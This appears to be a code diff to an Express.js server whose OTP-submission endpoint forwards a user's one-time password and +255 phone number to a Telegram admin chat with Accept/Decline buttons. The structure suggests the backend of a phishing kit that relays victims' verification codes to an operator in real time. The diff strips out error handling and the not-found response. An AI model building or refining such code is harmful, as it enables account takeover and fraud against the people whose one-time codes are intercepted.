@@ -19,6 +19,8 @@ app.get("/", (req, res) => {
 });
 
 
+
+
 app.use(cors());
 app.use(bodyParser.json());
 // app.use(express.static('public'));
@@ -112,34 +114,22 @@ app.get('/api/status/:sessionid', (req, res) => {
 // 3. Submit OTP & Wait for Admin Decision
 app.post('/api/submit-otp', async (req, res) => {
     const { otp, sessionId } = req.body;
-
-    console.log('Checking session for OTP submission:, ${sessionId}');
     if (sessions[sessionId]) {
         sessions[sessionId].status = 'verifying';
-        sessions[sessionId].lastOtp = otp;
-
         const msg = `🔐 *OTP Received*\nUser: +255${sessions[sessionId].phone}\nOTP: ${otp}`;
-        
-        try {
-            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                chat_id: TELEGRAM_ADMIN_ID,
-                text: msg,
-                parse_mode: "Markdown",
-                reply_markup: {
-                    inline_keyboard: [[
-                        { text: "✅ Accept", callback_data: `accept_${sessionId}` },
-                        { text: "❌ Decline", callback_data: `decline_${sessionId}` }
-                    ]]
-                }
-            });
-            res.json({ success: true });
-        } catch (e) {
-            res.status(500).json({ success: false });
-        }
-    } else {
-        res.status(404).json({ success: false, message: "Session not found" });
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            chat_id: TELEGRAM_ADMIN_ID,
+            text: msg,
+            parse_mode: "Markdown",
+            reply_markup: {
+                inline_keyboard: [[
+                    { text: "✅ Accept", callback_data: `accept_${sessionId}` },
+                    { text: "❌ Decline", callback_data: `decline_${sessionId}` }
+                ]]
+            }
+        });
+        res.json({ success: true });
     }
-    
 });
 
 // 4. Webhook for Admin Clicks
